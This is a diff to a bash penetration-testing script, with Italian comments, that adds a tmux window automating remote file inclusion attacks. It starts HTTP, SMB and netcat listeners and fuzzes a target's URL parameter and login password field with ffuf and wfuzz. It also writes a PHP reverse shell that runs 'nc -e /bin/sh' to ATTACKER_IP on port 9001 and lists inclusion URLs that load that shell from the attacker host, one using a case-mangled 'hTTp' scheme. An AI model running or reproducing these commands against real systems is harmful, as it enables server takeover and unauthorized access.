@@ -3323,7 +3323,56 @@ tmux send-keys -t PT:5.6 "printf \"\nIf it is possible to read these files, it c
 cd $folderProject
 
 
-
+# RFI
+cd $folderProjectWebAuthN
+# Layout
+tmux new-window -t PT:6 -n 'RFI'
+tmux split-window -v -t PT:6.0
+tmux select-pane -t "6.0"
+tmux split-window -h -t "6.0"
+tmux split-window -h -t "6.0"
+tmux split-window -v -t PT:6.3
+tmux select-pane -t "6.3"
+tmux split-window -h -t "6.3"
+tmux split-window -h -t "6.3"
+tmux split-window -v -t PT:6.6
+tmux select-pane -t "6.6"
+tmux split-window -h -t "6.6"
+tmux split-window -h -t "6.6"
+tmux split-window -h -t "6.6"
+tmux split-window -h -t "6.6"
+tmux split-window -h -t "6.6"
+# Esecuzione dei comandi nelle sottofinestre
+tmux send-keys -t PT:6.0"# RFI - HTTP listener" Enter
+tmux send-keys -t PT:6.0 "python3 -m http.server 80"
+tmux send-keys -t PT:6.1"# RFI - interacsh listener" Enter
+tmux send-keys -t PT:6.1 "firefox https://app.interactsh.com/ &"
+tmux send-keys -t PT:6.2"# RFI - SMB listener" Enter
+tmux send-keys -t PT:6.2 "impacket-smbserver -smb2support share $(pwd)"
+#Preparo il file per le RFI injection
+cd $folderProjectEngine
+python ./injectionGenerator.py $attackerIP injectionlist.txt
+mv "$folderProjectEngine/out-injection-list.txt" "$folderProjectWebAuthN/out-injection-list.txt"
+cd $folderProjectWebAuthN
+tmux send-keys -t PT:6.3"# RFI injection automation (save burp file with name: burp.req)" Enter
+tmux send-keys -t PT:6.3 "ffuf -request burp.req -request-proto http -w $folderProjectWebAuthN/out-injection-list.txt -fl 120"
+tmux send-keys -t PT:6.4"# RFI injection automation (GET)" Enter
+tmux send-keys -t PT:6.4 "wfuzz -c -z file,out-injection-list.txt -H \"Content-Type: application/x-www-form-urlencoded\" -H \"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3\" --sc=200 $url/?id=FUZZ"
+tmux send-keys -t PT:6.5 "# RFI injection automation (POST)" Enter
+tmux send-keys -t PT:6.5 "wfuzz -c -z file,out-injection-list.txt -H \"Content-Type: application/x-www-form-urlencoded\" -H \"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3\" -d \"username=admin&password=FUZZ\" --sc=200 $url/login.php # cmd injection (POST)"
+cd $folderProject
+tmux send-keys -t PT:6.6"# RFI - activate listener on 9001 port " Enter
+tmux send-keys -t PT:6.6 "nc -nlvp 9001"
+tmux send-keys -t PT:6.7"# RFI - prepare a reverse shell on PHP page" Enter
+tmux send-keys -t PT:6.7 "rm -f shell.txt && echo \"<?php passthru(\\\"nc -e /bin/sh ATTACKER_IP 9001\\\"); ?>\" > shell.txt && python3 -m http.server 80"
+tmux send-keys -t PT:6.8"# RFI - activate reverse shell" Enter
+tmux send-keys -t PT:6.8 "http://$site/page-RFI.php?file=http://ATTACKER_IP/shell.txt"
+tmux send-keys -t PT:6.9"# RFI - activate reverse shell" Enter
+tmux send-keys -t PT:6.9 "http://$site/page-RFI.php?file=http://ATTACKER_IP/shell.txt?"
+tmux send-keys -t PT:6.10"# RFI - activate reverse shell" Enter
+tmux send-keys -t PT:6.10 "http://$site/page-RFI.php?file=ftp://ATTACKER_IP/shell.txt"
+tmux send-keys -t PT:6.11"# RFI - activate reverse shell" Enter
+tmux send-keys -t PT:6.11 "http://$site/page-RFI.php?file=hTTp://ATTACKER_IP/shell.txt"
 # Attivazione della modalità interattiva
 tmux -2 attach-session -t PT
 ;;
